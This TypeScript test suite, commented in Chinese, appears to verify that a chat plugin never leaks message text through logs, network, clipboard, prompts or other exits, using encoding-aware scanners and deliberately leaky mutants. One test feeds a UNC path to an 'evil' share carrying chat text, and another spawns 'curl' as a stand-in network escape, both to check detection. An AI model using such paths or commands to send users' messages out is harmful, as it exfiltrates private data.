// CHAT4-ISO：聊天文字不外洩的測試框架，自己的測試。設計見 docs/drafts/chat4-iso-design.md。
// 分四層：
//   ①掃描器準不準（編碼、截短、鍵、錯誤、二進位；不誤報）  ②世界（world）的判定規則：什麼算出口、什麼可以放聊天文字
//   ③假的「正確」聊天模組對全部情境 0 違規，而且聊天分頁真的畫出了文字（正向對照，證明不是空轉）
//   ④每個故意漏的突變體都被抓到、報對出口種類（文字類走掃描，已讀回條／子行程這類沒有文字的走 A6 網路檢查，Markdown 走元素白名單）
// 之後 CHAT-4 接真模組時，在 chat-iso-real.test.ts 用同一個 isoTest／runMatrix。
import { expect, test } from 'claude-code/testing'

import { channelOf, classifyOp, EXIT_OPS } from './fixtures/chat-iso/exits'
import { HOSTILE_PHRASE, makeMarker, needlesOf, scanValue } from './fixtures/chat-iso/markers'
import type { Marker } from './fixtures/chat-iso/markers'
import { CHAT_ATOM, isoWorld } from './fixtures/chat-iso/world'
import type { Violation } from './fixtures/chat-iso/world'
import { CHAT_ACTIONS, isoTest, networkAllow, READ_ONLY_ACTIONS, runMatrix } from './fixtures/chat-iso/subject'
import { fakeChat, LEAKS } from './fixtures/chat-iso/fake-chat'
import type { FakeVariant } from './fixtures/chat-iso/fake-chat'

const utf8 = (s: string) => new TextEncoder().encode(s)
const b64 = (s: string) => { let bin = ''; for (const x of utf8(s)) bin += String.fromCharCode(x); return btoa(bin) }
const hex = (s: string) => Array.from(utf8(s), x => x.toString(16).padStart(2, '0')).join('')
const fmt = (v: readonly Violation[]) => v.map(x => `${x.channel} ${x.op}#${x.n} ${x.where} ${x.path} [${x.marker} ${x.variant}${x.via === 'direct' ? '' : ' via ' + x.via}: ${x.window.slice(0, 24)}]`)
const hits = (value: unknown, m: Marker, root = '$') => scanValue(value, needlesOf(m), root)

/** 只靠 A6 網路檢查（沒有文字可掃）抓的突變體；其餘靠文字掃描。markdown 靠元素白名單 */
const A6_ONLY = ['read-receipt', 'proc-receipt', 'query-receipt', 'body-ack'] as const
const TREE_ONLY = ['markdown'] as const

// ---------------------------------------------------------------- ① 掃描器

test('掃描器：原樣、大小寫、JSON、網址編碼、十六進位、base64 三種對齊，全部抓得到', () => {
  const m = makeMarker('text', 1)
  const t = m.full
  expect(hits(t, m).length).toBeGreaterThan(0)
  expect(hits(`prefix ${t} suffix`, m).length).toBeGreaterThan(0)
  expect(hits(t.toLowerCase(), m).length).toBeGreaterThan(0)
  expect(hits(t.toUpperCase().replace(/[^\x00-\x7f]/g, ''), m).length, '全大寫（非 ASCII 先拿掉，剩 ASCII 核心）').toBeGreaterThan(0)
  expect(hits(JSON.stringify({ a: { text: t } }), m).length, 'JSON 轉義（引號、換行、反斜線）').toBeGreaterThan(0)
  expect(hits(encodeURIComponent(t), m).length, '網址編碼').toBeGreaterThan(0)
  expect(hits(hex(t), m).length, '十六進位').toBeGreaterThan(0)
  for (const pad of ['', 'x', 'xx', 'xxx']) {
    expect(hits(b64(pad + t), m).length, `base64，前面墊 ${pad.length} 個位元組`).toBeGreaterThan(0)
    expect(hits(b64(pad + t).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''), m).length, `base64url，前面墊 ${pad.length}`).toBeGreaterThan(0)
  }
})

test('掃描器：截短的預覽（只取前 N 字或後 N 字）也抓得到，只要帶到一段最短視窗', () => {
  const m = makeMarker('text', 2)
  const t = Array.from(m.full)
  expect(hits(t.slice(0, 14).join(''), m).length, '前 14 字').toBeGreaterThan(0)
  expect(hits(t.slice(-14).join(''), m).length, '後 14 字').toBeGreaterThan(0)
  expect(hits(t.slice(0, 9).join(''), m).length, '前 9 字（比最短視窗 10 還短，抓不到是已知的限度，見設計短文 §5）').toBe(0)
  const cjk = m.cores.find(c => /[一-鿿]/.test(c.value))!.value
  expect(hits(Array.from(cjk).slice(2, 6).join(''), m).length, '中文核心的 4 個字').toBeGreaterThan(0)
  const name = makeMarker('senderName', 3)
  expect(hits(name.full.slice(0, 7), name).length, '寄件人名字只洩前 7 個字（最短視窗 6）').toBeGreaterThan(0)
})

test('掃描器：提示注入句任何位置的 19 字片段都抓得到（不留死角）', () => {
  const h = makeMarker('hostile', 4)
  for (let off = 0; off + 19 <= HOSTILE_PHRASE.length; off++) {
    expect(hits(HOSTILE_PHRASE.slice(off, off + 19), h).length, `從第 ${off} 字開始的 19 字`).toBeGreaterThan(0)
  }
})

test('掃描器：走進物件的鍵、陣列、Map、Set、Error、二進位資料、再編碼的字串；太深的結構會報告而不是默默略過', () => {
  const m = makeMarker('text', 5)
  const t = m.full
  expect(hits({ [t]: 1 }, m).map(h => h.path).join(), '物件的鍵').toContain('<key')
  expect(hits([1, [2, { x: t }]], m).length).toBeGreaterThan(0)
  expect(hits(new Map([[t, 1]]), m).length, 'Map 的鍵').toBeGreaterThan(0)
  expect(hits(new Map([['k', t]]), m).length, 'Map 的值').toBeGreaterThan(0)
  expect(hits(new Set([t]), m).length).toBeGreaterThan(0)
  expect(hits(new Error('boom ' + t), m).length, 'Error.message').toBeGreaterThan(0)
  expect(hits(Object.assign(new Error('x'), { cause: t }), m).length, 'Error.cause').toBeGreaterThan(0)
  expect(hits(utf8(t), m).length, 'Uint8Array').toBeGreaterThan(0)
  expect(hits(JSON.stringify({ body: b64(JSON.stringify({ text: t })) }), m).length, 'JSON 裡面的 base64 裡面的 JSON').toBeGreaterThan(0)
  expect(hits(encodeURIComponent(JSON.stringify({ q: t })), m).length, '網址編碼的 JSON').toBeGreaterThan(0)
  const cyc: any = { a: 1 }
  cyc.self = cyc
  expect(hits(cyc, m)).toEqual([])
  expect(hits({ fn: () => 1, sym: Symbol('x'), n: 5, u: undefined, nul: null }, m)).toEqual([])
  let deep: any = { leaf: t }
  for (let i = 0; i < 70; i++) deep = { next: deep }
  expect(hits(deep, m).some(h => h.path.includes('<too-deep>')), '超過 60 層：報告').toBe(true)
})

test('掃描器：寄件人名字、提示注入句各有自己的核心，互不混淆', () => {
  const name = makeMarker('senderName', 6)
  const hostile = makeMarker('hostile', 7)
  expect(hits(`from ${name.full}`, name).length).toBeGreaterThan(0)
  expect(hits(`hello ${name.full}`, hostile)).toEqual([])
  expect(hits(`please ${HOSTILE_PHRASE}`, hostile).length, '只出現注入句也算（對方的話被當指令了）').toBeGreaterThan(0)
  expect(hits(hostile.full, makeMarker('text', 8))).toEqual([])
})

test('掃描器：不誤報（隨機一般文字、真實會出現的外掛字串）', () => {
  const m = makeMarker('text', 9)
  const needles = needlesOf(m)
  expect(needles.length, '針的數量不爆炸').toBeLessThan(3000)
  const benign: string[] = [
    'Not sent. Your text is still in the box; press Send again.',
    '目前連不上中繼，會自動重試',
    '{"state":"working","conn":"abcdefghijklmnop","action":"fixing-bugs","subject":"website","version":"0.6.0"}',
    'https://friends-status-relay.friends-status-relay.workers.dev/chat/poll',
    'Authorization: Bearer 0123456789abcdefghijklmnopqrstuvwxyz',
    'aGVsbG8gd29ybGQgdGhpcyBpcyBhIHBsYWluIGJhc2U2NCBzdHJpbmc=',
  ]
  const alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -_/.,:;'
  for (let i = 0; i < 400; i++) {
    const bytes = crypto.getRandomValues(new Uint8Array(60))
    benign.push(Array.from(bytes, b => alphabet[b % alphabet.length]).join(''))
    benign.push(Array.from(crypto.getRandomValues(new Uint8Array(12)), b => String.fromCodePoint(0x4e00 + b * 37)).join(''))
  }
  const found = benign.flatMap(s => scanValue(s, needles))
  expect(found.map(h => h.window)).toEqual([])
})

// ---------------------------------------------------------------- ② 世界的判定規則（用合成紀錄，不需要被測模組）

test('世界：每個出口都有歸類；聊天 atom 與聊天分頁畫面是唯二允許放聊天文字的地方', async ($, on) => {
  const w = isoWorld(on)
  const m = makeMarker('text', 10)
  const all = [m]
  // 允許：寫聊天 atom、聊天分頁的畫面
  w.observe('state.set', { ...CHAT_ATOM, value: { messages: [{ text: m.full }] } })
  w.observe('ui.render', { requestId: 'chat' }, { type: 'Text', children: [m.full] })
  expect(w.violations(all)).toEqual([])
  expect(w.rendered(all).length, '畫面裡看得到（正向對照）').toBeGreaterThan(0)
  // 不允許：寫別的 atom、別的畫面
  w.observe('state.set', { plugin: 'with-friends', key: 'me', value: { pending: m.full } })
  w.observe('ui.render', { requestId: 'friends' }, { type: 'Text', children: ['x ' + m.full] })
  expect(w.violations(all).map(x => x.channel).sort()).toEqual(['extra-atom', 'render'])
  // 每一個出口 op 的參數有聊天文字都要被抓到
  const channels = new Set<string>()
  for (const op of Object.keys(EXIT_OPS)) {
    if (op === 'ui.render' || op === 'state.set') continue
    w.observe(op, { anything: { deep: [m.full] } }, { echoed: 'nothing' })
    channels.add(channelOf(op)!)
  }
  const seen = new Set(w.violations(all).map(x => x.op))
  for (const op of Object.keys(EXIT_OPS)) {
    if (op === 'ui.render' || op === 'state.set') continue
    expect(seen.has(op), `${op} 的參數有聊天文字卻沒被抓到`).toBe(true)
  }
  expect([...channels].sort()).toEqual(['clipboard', 'command-output', 'log', 'model-call', 'pane-meta', 'render', 'session', 'status-payload', 'store', 'toast'])
})

test('世界：外掛當 hook 回答引擎事件的回傳值要掃（進模型脈絡）；引擎自己帶進來的參數、外面給的回應不掃', async ($, on) => {
  const w = isoWorld(on)
  const m = makeMarker('text', 11)
  const all = [m]
  w.observe('brand.new.op', { x: m.full })
  expect(w.violations(all).map(x => x.channel)).toEqual(['unknown-op'])
  expect(w.unknownOps()).toContain('brand.new.op')

  const w2 = isoWorld(on)
  w2.observe('store.get', { key: m.full }, m.full)
  w2.observe('http.fetch', { url: 'https://relay.test/chat/poll', init: { method: 'POST', body: '{}' } }, { status: 200, text: JSON.stringify({ error: m.full }) })
  w2.observe('classic.PreToolUse', { tool_input: m.full }, { permissionDecision: 'allow' })
  w2.observe('model.classify', { text: 'fixed', labels: [] }, { value: m.full })
  expect(w2.violations(all), '讀取、中繼的回應、模型的答案、引擎帶進來的事件參數都不是外掛送出的').toEqual([])
  w2.observe('http.fetch', { url: 'https://relay.test/status', init: { body: JSON.stringify({ last: m.full }) } })
  w2.observe('command.run', { command: 'friends', args: '' }, { text: 'ok ' + m.full })
  w2.observe('prompt.section', { name: 'x', text: 'base' }, { text: m.full })
  w2.observe('attribution.text', { kind: 'commit', text: 'base' }, { text: m.full })
  w2.observe('skill.prompt', { skill: 's', text: 'base' }, { text: m.full })
  w2.observe('classic.UserPromptSubmit', { prompt: 'x' }, { additionalContext: [m.full] })
  w2.observe('fs.exists', { path: '\\\\evil\\share\\' + m.full.slice(0, 24) })
  const v = w2.violations(all)
  expect(v.map(x => `${x.op}:${x.where}`).sort()).toEqual([
    'attribution.text:result', 'classic.UserPromptSubmit:result', 'command.run:result', 'fs.exists:input', 'http.fetch:input', 'prompt.section:result', 'skill.prompt:result',
  ])
  expect(new Set(fmt(v)).size, '同一處只報一次').toBe(v.length)
})

test('世界：聊天分頁和別的分頁共用 requestId 時，只放行 chatKeyPrefix 開頭的子樹', async ($, on) => {
  const m = makeMarker('text', 12)
  const tree = (leakOutside: boolean) => ({
    type: 'Box', children: [
      { type: 'Text', children: [leakOutside ? 'friends list ' + m.full : 'friends list'] },
      { type: 'Box', props: { key: 'chat-tab' }, children: [{ type: 'Text', children: [m.full] }] },
    ],
  })
  const w = isoWorld(on, { renderId: 'friends', chatKeyPrefix: 'chat-' })
  w.observe('ui.render', { requestId: 'friends' }, tree(false))
  expect(w.violations([m]), '聊天子樹裡有文字是允許的').toEqual([])
  expect(w.rendered([m]).length).toBeGreaterThan(0)
  w.observe('ui.render', { requestId: 'friends' }, tree(true))
  const v = w.violations([m])
  expect(v.map(x => x.channel)).toEqual(['render'])
  expect(v[0]!.path).toContain('children[0]')
  // 沒給前綴＝整棵樹都放行：這正是盲審指出的陷阱，所以設計短文要求聊天分頁用獨立的 requestId
  const w2 = isoWorld(on, { renderId: 'friends' })
  w2.observe('ui.render', { requestId: 'friends' }, tree(true))
  expect(w2.violations([m])).toEqual([])
})

test('世界：聊天分頁的畫面樹只准 Box／Text／Button／Input，不准網址類屬性', async ($, on) => {
  const w = isoWorld(on)
  w.observe('ui.render', { requestId: 'chat' }, { type: 'Box', children: [{ type: 'Text', children: ['hi'] }, { type: 'Input', props: { key: 'd' } }, { type: 'Button', props: { key: 'b' } }] })
  expect(w.treeProblems()).toEqual([])
  w.observe('ui.render', { requestId: 'chat' }, { type: 'Box', children: [{ type: 'Markdown', props: { text: 'x' } }, { type: 'Link', props: { href: 'https://x.test' } }, { type: 'Image', props: { src: 'https://x.test/a.png' } }, { type: 'Client' }] })
  const p = w.treeProblems().join('\n')
  for (const t of ['Markdown', 'Link', 'Image', 'Client']) expect(p).toContain(`元素 ${t}`)
  expect(p).toContain('網址類屬性 href')
  expect(p).toContain('網址類屬性 src')
})

test('世界：A6 網路檢查——完整比對來源、路徑、query、body 欄位；子行程／MCP／模型也算逃出', async ($, on) => {
  const w = isoWorld(on)
  const allow = { origin: 'https://relay.test', paths: ['/chat/poll'], bodyKeys: { '/chat/poll': ['after'] } }
  const poll = (url: string, body: unknown) => w.observe('http.fetch', { url, init: { method: 'POST', body: body === undefined ? undefined : JSON.stringify(body) } })
  expect(w.networkEscapes([poll('https://relay.test/chat/poll', undefined), poll('https://relay.test/chat/poll', {}), poll('https://relay.test/chat/poll', { after: 3 }), w.observe('ui.toast', { text: 'x' })], allow)).toEqual([])
  expect(w.networkEscapes([poll('https://relay.test/chat/receipt', {})], allow).length, '別的路徑（已讀回條）').toBe(1)
  expect(w.networkEscapes([poll('https://relay.test/chat/poll?read=3', {})], allow).length, '多了 query').toBe(1)
  expect(w.networkEscapes([poll('https://relay.test/chat/poll', { ack: ['a'] })], allow).length, 'body 多了欄位').toBe(1)
  expect(w.networkEscapes([w.observe('http.fetch', { url: 'https://relay.test/chat/poll', init: { method: 'POST', body: 'not json' } })], allow).length, 'body 不是 JSON').toBe(1)
  expect(w.networkEscapes([poll('https://preview.example.test/page', {}), poll('not a url', {})], allow).length, '別的來源、不合法網址').toBe(2)
  for (const op of ['process.run', 'process.spawn', 'mcp.call', 'mcp.connect', 'model.classify']) {
    expect(w.networkEscapes([w.observe(op, { argv: ['curl'] })], allow).length, op).toBe(1)
  }
  expect(w.networkEscapes([w.observe('process.run', { argv: ['x'] })], { ...allow, allowOps: ['process.run'] })).toEqual([])
})

// ---------------------------------------------------------------- ③ 正確的假模組

const clean = fakeChat('clean')
isoTest('正確的假聊天模組：全部情境跑完，沒有任何出口出現聊天文字；聊天分頁真的畫出了文字', clean, async ($, w) => {
  const result = await runMatrix($, w, clean)
  const all = Object.values(result.markers)
  expect(fmt(w.violations(all))).toEqual([])
  expect(w.unknownOps(), '沒有沒歸類的 op').toEqual([])
  for (const name of CHAT_ACTIONS) expect(result.ran[name], `情境 ${name}`).toBe('ran')
  // hook 回答探測：這幾個一定要觸發成功（回答已掃描）；觸發不了的會列在 failed，不能默默略過
  for (const op of ['prompt.section', 'attribution.text', 'skill.prompt', 'prompt.context']) expect(result.probes.ok, `探測 ${op}`).toContain(op)
  expect(result.probes.failed, '探測失敗的事件（需要在 runMatrix 補上正確的觸發方式）').toEqual([])
  // 正向對照：訊息、寄件人名字、提示注入句、我自己送出的字，都在聊天分頁畫面裡出現過
  const shown = w.rendered(all)
  expect(shown.some(h => h.marker === result.markers.text.label), '訊息內文').toBe(true)
  expect(shown.some(h => h.marker === result.markers.senderName.label), '寄件人名字').toBe(true)
  expect(shown.some(h => h.marker === result.markers.hostile.label), '提示注入句也只畫在聊天分頁').toBe(true)
  expect(shown.some(h => h.marker === result.markers.draft.label), '我自己送出的字').toBe(true)
  // 畫面樹元素白名單；三種介面都畫過
  expect(w.treeProblems()).toEqual([])
  const surfaces = new Set(w.records.filter(r => r.op === 'ui.render' && (r.input as any).requestId === 'chat').map(r => (r.input as any).surface).filter(Boolean))
  expect([...surfaces].sort()).toEqual(['desktop', 'mobile', 'terminal'])
  // 該有的出口行為：送出走了 chat/publish，錯誤時只有固定句子的 toast
  const fetches = w.records.filter(r => r.op === 'http.fetch').map(r => String((r.input as any).url))
  expect(fetches.some(u => u.endsWith('/chat/publish'))).toBe(true)
  expect(w.records.filter(r => r.op === 'ui.toast').map(r => (r.input as any).text)).toEqual(['Not sent. Your text is still in the box.'])
  // 未讀只是數字：沒開分頁時收訊息，別的分頁只多一個數字
  const otherPane = w.records.filter(r => r.op === 'ui.render' && (r.input as any).requestId === 'friends-fake').map(r => JSON.stringify(r.result))
  expect(otherPane.some(s => /Chat \(\d+\)/.test(s))).toBe(true)
  // A6：只是「看」的情境（開分頁、捲動、收到訊息）沒有對中繼白名單以外的任何請求
  for (const name of READ_ONLY_ACTIONS) {
    const [from, to] = result.slices[name]!
    expect(w.networkEscapes(w.records.slice(from, to), networkAllow(clean)), `A6：${name}`).toEqual([])
  }
})

// ---------------------------------------------------------------- ④ 突變體

test('每種出口至少有一個突變體；每個突變體標的出口都真的在 exits.ts', () => {
  const covered = new Set<string>()
  for (const [name, leak] of Object.entries(LEAKS)) {
    covered.add(leak.channel)
    if (leak.channel !== 'extra-atom') expect(classifyOp(leak.op), `${name}: ${leak.op} 要在 exits.ts 歸類`).toBe('exit')
  }
  const channels = new Set<string>(Object.values(EXIT_OPS).map(r => r.channel))
  for (const ch of channels) expect(covered.has(ch), `沒有突變體會從「${ch}」漏出聊天文字，這一類的掃描沒有反向測試`).toBe(true)
  expect(covered.has('extra-atom')).toBe(true)
  expect(Object.keys(LEAKS).length).toBeGreaterThanOrEqual(34)
})

for (const variant of Object.keys(LEAKS) as (keyof typeof LEAKS)[]) {
  const leak = LEAKS[variant]
  const subject = fakeChat(variant as FakeVariant)
  isoTest(`突變體 ${variant}：${leak.note} → 抓得到、報成 ${leak.channel}`, subject, async ($, w) => {
    const result = await runMatrix($, w, subject)
    const all = Object.values(result.markers)
    const found = w.violations(all)
    if ((A6_ONLY as readonly string[]).includes(variant)) {
      // A6：沒有任何文字，文字掃描抓不到；靠網路檢查（只在「只是看」的情境裡）
      expect(fmt(found), '沒有帶文字，文字掃描本來就不該有報告').toEqual([])
      const escapes = READ_ONLY_ACTIONS.flatMap(name => {
        const [from, to] = result.slices[name]!
        return w.networkEscapes(w.records.slice(from, to), networkAllow(subject))
      })
      expect(escapes.length, `A6 網路檢查沒抓到 ${variant}`).toBeGreaterThan(0)
      return
    }
    if ((TREE_ONLY as readonly string[]).includes(variant)) {
      expect(w.treeProblems().some(p => p.includes('Markdown')), 'Markdown 元素被白名單抓到').toBe(true)
      return
    }
    const expected = found.filter(v => v.channel === leak.channel && v.op === leak.op)
    expect(expected.length, `沒抓到 ${leak.channel}/${leak.op}；實際抓到：${JSON.stringify(fmt(found))}`).toBeGreaterThan(0)
    // 只標到這一輪的標記
    expect(expected.every(v => all.some(m => m.label === v.marker))).toBe(true)
    // 只在自己那一類漏：沒有別類的違規（證明掃描沒有過寬、別條出口沒有被順便誤報）
    expect(fmt(found.filter(v => v.channel !== leak.channel)), `${variant} 只該在 ${leak.channel} 漏`).toEqual([])
  })
}
